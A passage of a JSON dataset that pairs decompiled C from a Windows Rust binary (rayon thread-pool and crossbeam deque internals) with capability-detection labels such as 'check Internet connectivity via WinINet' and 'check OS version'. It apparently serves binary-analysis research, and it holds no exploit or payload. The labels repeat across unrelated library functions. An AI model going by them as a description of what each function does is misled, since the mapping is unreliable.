>> 0x1b ^ uVar6;\n            *(iStack176 + 0x128) = uVar6;\n            puStack232 = (uVar6 * 0x2545f4914f6cdd1d) % puVar11;\n            uStack240 = 1;\n            uStack216 = 1;\n            puStack208 = NULL;\n            uStack104 = &puStack120;\n            uStack96 = &iStack176;\n            uStack88 = &uStack261;\n            puStack224 = puVar11;\n            puStack200 = puStack232;\n            iStack192 = iStack176;\n            piStack112 = &iStack192;\n            do {\n                puVar13 = puStack232;\n                if (puStack224 <= puStack232) {\n                    uStack152 = uStack96;\n                    uStack148 = uStack96._4_4_;\n                    uStack144 = uStack88;\n                    uStack140 = uStack88._4_4_;\n                    piStack168 = piStack112;\n                    uStack160 = uStack104;\n                    uStack156 = uStack104._4_4_;\n                    goto code_r0x0040fdd0;\n                }\n                arg2 = puStack232;\n                puStack232 = puStack232 + 1;\n                piVar2 = sym.core::iter::adapters::filter::filter_try_fold::__u7b__u7b_closure_u7d__u7d_::hed7bdfc9786469d5\n                                   (&piStack112, puVar13);\n                puVar13 = arg2;\n            } while (arg2 == NULL);\n            goto code_r0x0040fdfd;\n        }\n        goto code_r0x0040fe29;\n    }\n    goto code_r0x0041015b;\n    while( true ) {\n        puStack208 = puStack208 + 1;\n        piVar2 = sym.core::iter::adapters::filter::filter_try_fold::__u7b__u7b_closure_u7d__u7d_::hed7bdfc9786469d5\n                           (&piStack168, puVar13);\n        puVar13 = arg2;\n        if (arg2 != NULL) break;\ncode_r0x0040fdd0:\n        puVar13 = puStack208;\n        arg2 = puStack208;\n        if (puStack200 <= puStack208) {\n            piVar2 = unaff_R13;\n            puVar13 = NULL;\n            break;\n        }\n    }\ncode_r0x0040fdfd:\n    unaff_R13 = piVar2;\n    if ((puVar13 != NULL) || ((uStack261 & 1) == 0)) goto code_r0x0040fe14;\n    goto code_r0x0040fcdf;\ncode_r0x0040fe14:\n    if (puVar13 == NULL) {\n        iVar9 = *(arg1 + 0x130);\ncode_r0x0040fe29:\n        do {\n            piStack168 = piStack168 & 0xffffffff00000000;\n            while( true ) {\n                arg1 = iStack248;\n                puVar12 = puStack256;\n                uVar6 = *(iVar9 + 0x80);\n                arg1_00 = *(iVar9 + 0x88);\n                uVar10 = uVar6 >> 1 & 0x3f;\n                puVar11 = uVar10;\n                if (puVar11 != 0x3f) break;\n                sym._ZN15crossbeam_utils7backoff7Backoff6snooze17he19e96ba0c9f83d6E.197(&piStack168);\n            }\n            uVar7 = uVar6 + 2;\n            if ((uVar6 & 1) == 0) {\n                arg2 = *(iVar9 + 0x100) >> 1;\n                if (uVar6 >> 1 == arg2) goto code_r0x0040fe9d;\n                uVar7 = uVar7 | 0x7f < (*(iVar9 + 0x100) ^ uVar6);\n            }\n            LOCK();\n            puVar12 = iVar9 + 0x80;\n            uVar1 = *puVar12;\n            *puVar12 = *puVar12 ^ (uVar6 == uVar1) * (*puVar12 ^ uVar7);\n            if (uVar6 == uVar1) {\n                if (uVar10 == 0x3e) {\n                    uStack240 = uStack240 & 0xffffffff00000000;\n                    while (piVar2 = *arg1_00,  piVar2 == NULL) {\n                        sym._ZN15crossbeam_utils7backoff7Backoff6snooze17he19e96ba0c9f83d6E.197(&uStack240);\n                    }\n                    iVar3 = *piVar2;\n                    *(iVar9 + 0x88) = piVar2;\n                    *(iVar9 + 0x80) = iVar3 != 0 | uVar7 + 2 & 0xfffffffffffffffe;\n                }\n                uStack240 = uStack240 & 0xffffffff00000000;\n                ppiVar8 = arg1_00 + puVar11 * 3 + 3;\n                while ((*ppiVar8 & 1) == 0) {\n                    sym._ZN15crossbeam_utils7backoff7Backoff6snooze17he19e96ba0c9f83d6E.197(&uStack240);\n                }\n                piVar2 = arg1_00[puVar11 * 3 + 1];\n                puVar13 = arg1_00[puVar11 * 3 + 2];\n                arg2 = 0x3e;\n                if (puVar11 == 0x3e) {\ncode_r0x00410144:\n                    sym.crossbeam_deque::deque::Block_T_::destroy::h4f1d6e1cf366fa83(arg1_00, arg2, in_R8);\n                    arg1 = iStack248;\n                    puVar12 = puStack256;\n                }\n                else {\n                    piVar4 = *ppiVar8;\n                    do {\n                        LOCK();\n                        bVar14 = piVar4 == *ppiVar8;\n                        *ppiVar8 = *ppiVar8 ^ bVar14 * (*ppiVar8 ^ (piVar4 | 2));\n                        piVar4 = piVar4 ^ !bVar14 * (piVar4 ^ *ppiVar8);\n                    } while (!bVar14);\n                    arg2 = puVar11;\n                    arg1 = iStack248;\n                    puVar12 = puStack256;\n                    if ((piVar4 & 4) != 0) goto code_r0x00410144;\n                }\n                break;\n            }\n        } while( true );\n    }\ncode_r0x0041015b:\n    sym.rayon_core::sleep::Sleep::work_found::h7414ea3b54864ef5(*(arg1 + 0x130) + 0x1a8);\n    (*puVar13)(piVar2);\n    uStack184 = *(arg1 + 0x120);\n    LOCK();\n    piVar4 = *(arg1 + 0x130) + 0x1d0;\n    *piVar4 = *piVar4 + 0x10000;\n    unaff_R13 = piVar2;\n    goto code_r0x0040fc5d;\ncode_r0x0040fe9d:\n    if (uStack260 < 0x20) {\n        sub.KERNEL32.dll_SwitchToThread();\n        uStack260 = uStack260 + 1;\n        arg1 = iStack248;\n        puVar12 = puStack256;\n    }\n    else {\n        iVar9 = *(iStack248 + 0x130);\n        if (uStack260 == 0x20) {\n            do {\n                uVar7 = *(iVar9 + 0x1d0);\n                uVar6 = uVar7;\n                if ((uVar7 & 0x100000000) == 0) break;\n                uVar6 = uVar7 + 0x100000000;\n                LOCK();\n                puVar13 = iVar9 + 0x1d0;\n                uVar1 = *puVar13;\n                *puVar13 = *puVar13 ^ (uVar7 == uVar1) * (*puVar13 ^ uVar6);\n            } while (uVar7 != uVar1);\n            sub.KERNEL32.dll_SwitchToThread();\n            uStack260 = 0x21;\n            uStack136 = uVar6 >> 0x20;\n        }\n        else {\n            LOCK();\n            uVar6 = *puStack256;\n            *puStack256 = *puStack256 ^ (uVar6 == 0) * (*puStack256 ^ 1);\n            if (uVar6 == 0) {\n                in_R8 = 0x448ab8;\n                iVar3 = sym._alloc::vec::Vec_T_A__as_core::ops::index::Index_I__::index::h03d0b9f747e8ea10\n                                  (iVar9 + 0x1b8, uStack184, 0x448ab8);\n                sym.std::sync::mutex::Mutex_T_::lock::h62098323f0fb8253(&uStack240, iVar3);\n                arg2 = 0x448ad0;\n                piVar2 = sym.core::result::Result_T_E_::unwrap::h275888c52c276ebd(&uStack240, 0x448ad0);\n                uStack160 = uStack160 & 0xffffff00 | arg2;\n                uStack260 = 0;\n                LOCK();\n                uVar6 = *puVar12;\n                *puVar12 = *puVar12 ^ (uVar6 == 1) * (*puVar12 ^ 2);\n                piStack168 = piVar2;\n                if (uVar6 == 1) {\n                    do {\n                        uVar6 = *(iVar9 + 0x1d0);\n                        if (uVar6 >> 0x20 != uStack136) {\n                            uStack260 = 0x20;\n                            if (*puVar12 != 3) {\n                                LOCK();\n                                *puVar12 = *puVar12 ^ (*puVar12 == 2) * *puVar12;\n                            }\n                            goto code_r0x00410010;\n                        }\n                        LOCK();\n                        puVar13 = iVar9 + 0x1d0;\n                        uVar7 = *puVar13;\n                        *puVar13 = *puVar13 ^ (uVar6 == uVar7) * (*puVar13 ^ uVar6 + 1);\n                    } while (uVar6 != uVar7);\n                    if ((*(*(arg1 + 0x130) + 0x100) ^ *(*(arg1 + 0x130) + 0x80)) < 2) {\n                        *(piVar2 + 9) = 1;\n                        cVar5 = '\\x01';\n                        while (cVar5 != '\\0') {\n                            sym.std::sync::condvar::Condvar::wait::h04043a752ec3db26\n                                      (&uStack240, iVar3 + 0x10, piVar2, CONCAT71(in_R9, arg2 != 0));\n                            uVar6 = 0x448ae8;\n                            in_R8 = piVar2;\n                            piVar2 = sym.core::result::Result_T_E_::unwrap::h275888c52c276ebd(&uStack240, 0x448ae8);\n                            arg2 = uVar6 & 0xffffffffffffff01;\n                            cVar5 = *(piVar2 + 9);\n                        }\n                        uStack160 = uStack160 & 0xffffff00 | arg2;\n                        piStack168 = piVar2;\n                    }\n                    else {\n                        LOCK();\n                        *(iVar9 + 0x1d0) = *(iVar9 + 0x1d0) + -1;\n                    }\n                    if (*puVar12 != 3) {\n                        LOCK();\n                        *puVar12 = *puVar12 ^ (*puVar12 == 2) * *puVar12;\n                    }\n                    sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_bool__::h1d527a45e74a1c46(&piStack168);\n                    uStack260 = 0;\n                    uStack136 = 0xffffffffffffffff;\n                }\n                else {\ncode_r0x00410010:\n                    sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_bool__::h1d527a45e74a1c46(&piStack168);\n                    uStack136 = 0xffffffffffffffff;\n                }\n            }\n        }\n    }\n    goto code_r0x0040fc74;\n}\n",
        "token_count": 3660
    },
    "effa62d1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong sym.crossbeam_deque::deque::Worker_T_::pop::heffa62d1c96fb557(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    ulong unaff_R14;\n    ulong uVar8;\n    \n    // crossbeam_deque::deque::Worker<T>::pop::heffa62d1c96fb557\n    iVar3 = *arg1;\n    iVar4 = *(iVar3 + 0x108);\n    iVar6 = iVar4 - *(iVar3 + 0x100);\n    if (iVar6 < 1) {\n        return unaff_R14;\n    }\n    if (*(arg1 + 3) == '\\0') {\n        LOCK();\n        puVar2 = iVar3 + 0x100;\n        uVar1 = *puVar2;\n        *puVar2 = *puVar2 + 1;\n        if (iVar4 + ~uVar1 < 0) {\n            *(*arg1 + 0x100) = uVar1;\n            return unaff_R14;\n        }\n        uVar7 = arg1[2];\n        uVar8 = *(arg1[1] + (uVar7 - 1 & uVar1) * 0x10);\n        if (uVar7 < 0x41) {\n            return uVar8;\n        }\n        if (uVar7 / 4 < iVar6) {\n            return uVar8;\n        }\n    }\n    else {\n        uVar1 = iVar4 - 1;\n        *(iVar3 + 0x108) = uVar1;\n        iVar3 = *arg1;\n        uVar5 = *(iVar3 + 0x100);\n        if (uVar1 - uVar5 < 0) {\n            *(iVar3 + 0x108) = iVar4;\n            return unaff_R14;\n        }\n        uVar7 = arg1[2];\n        uVar8 = *(arg1[1] + (uVar7 - 1 & uVar1) * 0x10);\n        if (uVar1 == uVar5) {\n            LOCK();\n            puVar2 = iVar3 + 0x100;\n            *puVar2 = *puVar2 ^ (uVar5 == *puVar2) * (*puVar2 ^ uVar5 + 1);\n            *(*arg1 + 0x108) = iVar4;\n            return uVar8;\n        }\n        if (uVar7 < 0x41) {\n            return uVar8;\n        }\n        if (uVar7 / 4 <= uVar1 - uVar5) {\n            return uVar8;\n        }\n    }\n    sym.crossbeam_deque::deque::Worker_T_::resize::h83bdeaa1124dc112(arg1, uVar7 >> 1);\n    return uVar8;\n}\n",
        "token_count": 663
    },
    "275888c5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t sym.core::result::Result_T_E_::unwrap::h275888c52c276ebd(int64_t *arg1, ulong arg2)\n\n{\n    int64_t iStack16;\n    uchar uStack8;\n    \n    // core::result::Result<T,E>::unwrap::h275888c52c276ebd\n    if (*arg1 == 0) {\n        return arg1[1];\n    }\n    iStack16 = arg1[1];\n    uStack8 = *(arg1 + 2);\n    dbg.unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", 0x2b, &iStack16, 0x448880);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 165
    },
    "83bdeaa1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.crossbeam_deque::deque::Worker_T_::resize::h83bdeaa1124dc112(int64_t *arg1, uint64_t arg2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong arg1_00;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int64_t arg1_01;\n    ulong uVar9;\n    uint64_t arg2_00;\n    uint64_t uVar10;\n    int64_t iStack104;\n    code *pcStack96;\n    ulong uStack88;\n    \n    // crossbeam_deque::deque::Worker<T>::resize::h83bdeaa1124dc112\n    uVar3 = *(*arg1 + 0x108);\n    uVar10 = *(*arg1 + 0x100);\n    iVar4 = arg1[1];\n    iVar5 = arg1[2];\n    arg2_00 = arg2;\n    arg1_01 = sym.crossbeam_deque::deque::Buffer_T_::alloc::h9349ff97b3f5150f(arg2);\n    for (; uVar3 != uVar10; uVar10 = uVar10 + 1) {\n        puVar1 = iVar4 + (uVar10 & iVar5 - 1U) * 0x10;\n        uVar6 = puVar1[1];\n        uVar7 = puVar1[2];\n        uVar8 = puVar1[3];\n        puVar2 = arg1_01 + (uVar10 & arg2_00 - 1) * 0x10;\n        *puVar2 = *puVar1;\n        puVar2[1] = uVar6;\n        puVar2[2] = uVar7;\n        puVar2[3] = uVar8;\n    }\n    iStack104 = sym.crossbeam_epoch::default::pin::h365a3891add9bf07();\n    arg1[1] = arg1_01;\n    arg1[2] = arg2_00;\n    iVar4 = *arg1;\n    uVar9 = sym._T_as_crossbeam_epoch::atomic::Pointable_::init::h4b2bba14c22a45c9(arg1_01, arg2_00);\n    iVar5 = iStack104;\n    arg1_00 = *(iVar4 + 0x80);\n    *(iVar4 + 0x80) = uVar9;\n    if (iStack104 == 0) {\n        sym.crossbeam_deque::deque::Worker_T_::resize::__u7b__u7b_closure_u7d__u7d_::h1482da0738106299(arg1_00);\n    }\n    else {\n        pcStack96 = sym.crossbeam_epoch::deferred::Deferred::new::call::he2e8824c5322d2ce;\n        uStack88 = arg1_00;\n        sym.crossbeam_epoch::internal::Local::defer::h50a2d7bf5314df47(iStack104, &pcStack96);\n        if (((arg2 & 0xfffffffffffffc0) != 0) && (iVar5 != 0)) {\n            if (*(iVar5 + 0x818) != 0) {\n                sym.crossbeam_epoch::internal::Global::push_bag::h676195a937628f8d(*(iVar5 + 0x10) + 0x80);\n            }\n            sym.crossbeam_epoch::internal::Global::collect::h6708353a970a45c2(*(iVar5 + 0x10) + 0x80);\n        }\n    }\n    sym.core::ptr::drop_in_place_crossbeam_epoch::guard::Guard_::hd880b2431d44c8fc(&iStack104);\n    return;\n}\n",
        "token_count": 858
    },
    "7425f3ef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * sym.rayon_core::registry::WORKER_THREAD_STATE::__getit::h7425f3ef4f320343(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    ulong *arg2;\n    int64_t iVar2;\n    \n    // rayon_core::registry::WORKER_THREAD_STATE::__getit::h7425f3ef4f320343\n    piVar1 = sym._ZN3std10sys_common16thread_local_key9StaticKey3get17heff87df9eba4a787E.198(0x443048);\n    if ((piVar1 < 0x2) || (*piVar1 == 0)) {\n        arg2 = sym._ZN3std10sys_common16thread_local_key9StaticKey3get17heff87df9eba4a787E.198(0x443048);\n        if (arg2 == 0x1) {\n            piVar1 = NULL;\n        }\n        else {\n            if (arg2 == NULL) {\n                arg2 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.184(0x18, 8);\n                *arg2 = 0;\n                arg2[2] = 0x443048;\n                sym._ZN3std10sys_common16thread_local_key9StaticKey3set17hb8e9483efec9e5adE.199(0x443048, arg2);\n            }\n            if ((arg1 == NULL) || (iVar2 = *arg1,  *arg1 = 0,  iVar2 != 1)) {\n                iVar2 = 0;\n            }\n            else {\n                iVar2 = arg1[1];\n            }\n            piVar1 = arg2 + 1;\n            *arg2 = 1;\n            arg2[1] = iVar2;\n        }\n    }\n    else {\n        piVar1 = piVar1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 439
    },
    "159c8b1b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ops::function::FnOnce::call_once_u7b__u7b_vtableshim_u7d__u7d_::h159c8b1bd447e1f3(int64_t *arg1)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t **ppiVar3;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    int64_t iStack144;\n    ulong uStack136;\n    ulong uStack128;\n    int64_t aiStack120 [8];\n    ulong auStack56 [3];\n    \n    // core::ops::function::FnOnce::call_once$u7b$$u7b$vtableshim$u7d$$u7d$::h159c8b1bd447e1f3\n    iVar2 = *(*arg1 + 0x10);\n    if ((iVar2 != 0) && (dbg.from_utf8(&iStack144, iVar2, *(*arg1 + 0x18) + -1),  iStack144 == 0)) {\n        dbg.inner(aiStack120, uStack136, uStack128);\n        if (aiStack120[0] == 0) {\n            uVar1 = sub.KERNEL32.dll_GetCurrentThread();\n            (**0x443090)(uVar1, aiStack120[1]);\n            if ((aiStack120[2] != 0) && ((aiStack120[2] & 0x7fffffffffffffffU) != 0)) {\n                sym.__rust_dealloc(aiStack120[1], 2);\n            }\n        }\n        else {\n            dbg.drop_in_place<std::io::error::Error>(aiStack120[1]);\n        }\n    }\n    aiStack120[0] = sym.std::io::stdio::set_output_capture::hbbf000a2b5bc7f34(arg1[1]);\n    fcn.00410a56(aiStack120);\n    dbg.set(*arg1);\n    piVar4 = arg1 + 2;\n    piVar5 = aiStack120;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar5 = *piVar4;\n        piVar4 = piVar4 + 1;\n        piVar5 = piVar5 + 1;\n    }\n    sym.std::sys_common::backtrace::__rust_begin_short_backtrace::hdb3fa78f4dcaf823(aiStack120);\n    iVar2 = arg1[0xd];\n    ppiVar3 = arg1 + 0xd;\n    sym._ZN4core3ptr158drop_in_place_LT_core..option..Option_LT_core..result..Result_LT__LP__RP__C_alloc..boxed..Box_LT_dyn_u20_core..\n              (iVar2 + 0x18);\n    *(iVar2 + 0x18) = 1;\n    *(iVar2 + 0x20) = 0;\n    piVar4 = *ppiVar3;\n    LOCK();\n    *piVar4 = *piVar4 + -1;\n    if (*piVar4 != 0) {\n        return;\n    }\n    piVar4 = *ppiVar3;\n    aiStack120[3] = 0x410998;\n    sym._ZN4core3ptr158drop_in_place_LT_core..option..Option_LT_core..result..Result_LT__LP__RP__C_alloc..boxed..Box_LT_dyn_u20_core..\n              (piVar4 + 3);\n    piVar4[3] = 0;\n    auStack56[0] = 0;\n    aiStack120[3] = 0x4109ab;\n    sym._ZN4core3ptr130drop_in_place_LT_core..result..Result_LT__LP__RP__C_alloc..boxed..Box_LT_dyn_u20_core..any..Any_u2b_core..marke\n              (auStack56);\n    if (piVar4[2] != 0) {\n        aiStack120[3] = 0x4109cf;\n        dbg.decrement_num_running_threads(piVar4[2] + 0x10);\n        piVar5 = piVar4[2];\n        if (piVar5 != NULL) {\n            LOCK();\n            *piVar5 = *piVar5 + -1;\n            if (*piVar5 == 0) {\n                aiStack120[3] = 0x4109e5;\n                sym.alloc::sync::Arc_T_::drop_slow::h3fc1640c6aa8ef54(piVar4 + 2);\n            }\n        }\n    }\n    aiStack120[3] = 0x4109ed;\n    sym._ZN4core3ptr158drop_in_place_LT_core..option..Option_LT_core..result..Result_LT__LP__RP__C_alloc..boxed..Box_LT_dyn_u20_core..\n              (piVar4 + 3);\n    piVar4 = *ppiVar3;\n    if (piVar4 != 0xffffffffffffffff) {\n        LOCK();\n        piVar5 = piVar4 + 1;\n        *piVar5 = *piVar5 + -1;\n        if (*piVar5 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, piVar4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 1224
    },
    "845921dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.core::result::Result_T_E_::ok::h845921dc3cefa0c1(ulong *arg1, int64_t *arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    int64_t iStack8;\n    \n    // core::result::Result<T,E>::ok::h845921dc3cefa0c1\n    if (*arg2 == 0) {\n        arg1[2] = arg2[3];\n        uVar1 = *(arg2 + 0xc);\n        uVar2 = *(arg2 + 2);\n        uVar3 = *(arg2 + 0x14);\n        *arg1 = *(arg2 + 1);\n        *(arg1 + 4) = uVar1;\n        *(arg1 + 1) = uVar2;\n        *(arg1 + 0xc) = uVar3;\n    }\n    else {\n        iStack8 = arg2[3];\n        *arg1 = 0;\n        uStack24 = *(arg2 + 1);\n        uStack20 = *(arg2 + 0xc);\n        uStack16 = *(arg2 + 2);\n        uStack12 = *(arg2 + 0x14);\n        if (arg2[1] != 0) {\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(&uStack24);\n        }\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "64b45a65": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.std::sync::once::Once::call_once::__u7b__u7b_closure_u7d__u7d_::h64b45a65ef2a6107(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    uint8_t uVar2;\n    code **ppcVar3;\n    uchar auVar4 [16];\n    unkbyte6 Var5;\n    char cVar6;\n    uint16_t uVar7;\n    ushort uVar8;\n    uint32_t uVar9;\n    ulong uVar10;\n    ulong uVar11;\n    int64_t *piVar12;\n    int64_t iVar13;\n    int64_t *arg2;\n    int64_t iVar14;\n    int64_t *piVar15;\n    int64_t *piVar16;\n    int64_t **ppiVar17;\n    ulong *puVar18;\n    int64_t iVar19;\n    ulong *puVar20;\n    int64_t *piVar21;\n    int64_t *piVar22;\n    int64_t *piVar23;\n    int64_t *piVar24;\n    uint64_t arg2_00;\n    ulong *puVar25;\n    ulong *puVar26;\n    uint64_t uVar27;\n    ulong *puVar28;\n    int64_t *piVar29;\n    bool bVar30;\n    uint uVar31;\n    uint uVar32;\n    uint uVar33;\n    uint uVar34;\n    ulong var_420h;\n    ulong var_438h;\n    ulong in_stack_fffffffffffffb20;\n    uint uVar35;\n    int64_t *piStack1152;\n    uint uStack1144;\n    uint32_t uStack1140;\n    uint32_t uStack1136;\n    uint32_t uStack1132;\n    uint uStack1128;\n    uint32_t uStack1124;\n    int64_t *piStack1120;\n    uint64_t uStack1112;\n    ulong uStack1104;\n    ulong uStack1096;\n    int64_t *piStack1088;\n    int64_t *piStack1080;\n    int64_t *piStack1072;\n    int64_t *piStack1064;\n    ulong uStack1056;\n    uint uStack1048;\n    uint uStack1044;\n    ulong uStack1040;\n    ulong uStack1032;\n    ulong uStack1024;\n    ulong uStack1016;\n    int64_t *piStack1008;\n    int64_t *piStack1000;\n    int64_t *piStack992;\n    int64_t *piStack984;\n    int64_t *piStack976;\n    int64_t *piStack968;\n    int64_t *piStack960;\n    int64_t *piStack952;\n    int64_t *piStack944;\n    int64_t *piStack936;\n    uchar auStack928 [16];\n    int64_t iStack912;\n    int64_t iStack904;\n    code **ppcStack896;\n    int64_t *piStack888;\n    int64_t *piStack880;\n    ulong uStack872;\n    int64_t iStack864;\n    ulong auStack856 [2];\n    uchar uStack840;\n    uint uStack832;\n    uint uStack828;\n    uint uStack824;\n    uint uStack820;\n    int64_t *piStack816;\n    uint uStack800;\n    uint uStack796;\n    uint uStack792;\n    uint uStack788;\n    int64_t *piStack784;\n    uint uStack768;\n    uint16_t uStack764;\n    ushort uStack762;\n    uint uStack760;\n    ushort uStack756;\n    ushort uStack754;\n    unkbyte6 Stack752;\n    ushort uStack746;\n    ulong *puStack744;\n    int64_t *piStack736;\n    int64_t *piStack728;\n    uint uStack512;\n    uint16_t uStack508;\n    ushort uStack506;\n    uint uStack504;\n    uint uStack500;\n    unkbyte6 Stack496;\n    ushort uStack490;\n    int64_t *piStack488;\n    uchar auStack480 [16];\n    uchar auStack400 [16];\n    uchar auStack384 [16];\n    \n    // std::sync::once::Once::call_once::_$u7b$$u7b$closure$u7d$$u7d$::h64b45a65ef2a6107\n    piStack1080 = **arg1;\n    **arg1 = 0;\n    if (piStack1080 == NULL) {\n        dbg.panic(0x44bcbb, 0x2b, 0x448730);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    iStack904 = 0;\n    piStack888 = NULL;\n    uStack872 = 0;\n    auStack856[0] = 0;\n    uStack840 = 0;\n    auStack928 = ZEXT816(0);\n    dbg._var(&uStack512, \"RAYON_NUM_THREADSRAYON_RS_NUM_CPUSThreadPoolBuildError\");\n    sym.core::result::Result_T_E_::ok::h845921dc3cefa0c1(&uStack768, &uStack512);\n    if (CONCAT26(uStack762, CONCAT24(uStack764, uStack768)) == 0) {\ncode_r0x00410d3b:\n        piVar22 = &uStack512;\n        dbg._var(piVar22, \"RAYON_RS_NUM_CPUSThreadPoolBuildError\");\n        sym.core::result::Result_T_E_::ok::h845921dc3cefa0c1(&uStack768, piVar22);\n        if (CONCAT26(uStack762, CONCAT24(uStack764, uStack768)) != 0) {\n            Stack496 = Stack752;\n            uStack490 = uStack746;\n            uStack500 = CONCAT22(uStack754, uStack756);\n            uStack512 = uStack768;\n            uStack508 = uStack764;\n            uStack506 = uStack762;\n            uStack504 = uStack760;\n            piVar22 = CONCAT26(uStack762, CONCAT24(uStack764, uStack768));\n            dbg.from_str(&uStack1056, piVar22, CONCAT26(uStack746, Stack752));\n            uVar27 = CONCAT44(uStack1044, uStack1048);\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(&uStack512);\n            if (uStack1056 == '\\0') goto code_r0x00410daf;\n        }\ncode_r0x00410db4:\n        auStack480 = ZEXT816(0);\n        Stack496 = 0;\n        uStack490 = 0;\n        piStack488 = NULL;\n        uStack512 = 0;\n        uStack508 = 0;\n        uStack506 = 0;\n        uStack504 = 0;\n        uStack500 = 0;\n        sub.KERNEL32.dll_GetSystemInfo(&uStack512);\n        uVar27 = auStack480._0_4_;\n    }\n    else {\n        Stack496 = Stack752;\n        uStack490 = uStack746;\n        uStack500 = CONCAT22(uStack754, uStack756);\n        uStack512 = uStack768;\n        uStack508 = uStack764;\n        uStack506 = uStack762;\n        uStack504 = uStack760;\n        piVar22 = CONCAT26(uStack762, CONCAT24(uStack764, uStack768));\n        dbg.from_str(&uStack1056, piVar22, CONCAT26(uStack746, Stack752));\n        cVar6 = uStack1056;\n        uVar27 = CONCAT44(uStack1044, uStack1048);\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(&uStack512);\n        if (cVar6 != '\\0') goto code_r0x00410d3b;\ncode_r0x00410daf:\n        if (uVar27 == 0) goto code_r0x00410db4;\n    }\n    uStack1032 = 0xffff;\n    if (uVar27 < 0xffff) {\n        uStack1032 = uVar27;\n    }\n    uVar31 = 0;\n    uVar32 = 0;\n    uVar33 = 0;\n    uVar34 = 0;\n    uStack760 = 0;\n    uStack756 = 0;\n    uStack754 = 0;\n    Stack752 = 0;\n    uStack746 = 0;\n    piStack736 = NULL;\n    piStack728 = NULL;\n    puVar25 = 0x8;\n    uStack768 = 8;\n    uStack764 = 0;\n    uStack762 = 0;\n    puStack744 = 0x8;\n    if (uStack1032 != 0) {\n        uVar11 = 0;\n        uVar10 = sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h635adc2ea036215c(&uStack768, 0, uStack1032);\n        sym._ZN5alloc7raw_vec14handle_reserve17h5bdf8892013f3606E.183(uVar10, uVar11);\n        piVar22 = piStack728;\n        if (piStack736 - piStack728 < uStack1032) {\n            uVar10 = sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h759dfdd931a2252f\n                               (&puStack744, piStack728, uStack1032);\n            sym._ZN5alloc7raw_vec14handle_reserve17h5bdf8892013f3606E.183(uVar10, piVar22);\n        }\n    }\n    uVar27 = uStack1032;\n    while (piVar29 = piStack728,  piVar12 = piStack736,  puVar18 = puStack744,  uVar8 = uStack762,  uVar7 = uStack764, \n          uVar35 = uStack768,  bVar30 = uVar27 != 0,  uVar27 = uVar27 - 1,  bVar30) {\n        uVar10 = sym.crossbeam_deque::deque::Buffer_T_::alloc::h9349ff97b3f5150f(0x40);\n        uVar11 = 